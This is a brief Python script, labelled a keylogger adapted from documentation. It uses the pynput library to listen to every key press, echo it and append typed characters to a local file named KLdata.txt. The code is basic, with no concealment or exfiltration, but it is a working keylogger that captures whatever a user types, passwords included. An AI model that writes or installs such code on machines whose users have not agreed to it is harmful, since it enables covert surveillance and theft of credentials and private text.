#key logger from documentation
from pynput import keyboard

def press(key):
	try:
		print('{0}'.format(key.char))
		with open('KLdata.txt', 'a') as k:
			k.write(key.char)
	except AttributeError:
		print('special key {0}'.format(key))

# def release(key):
# 	print('{0} released'.format(key))

with keyboard.Listener(on_press=press) as l:  	#,on_release=release
	l.join()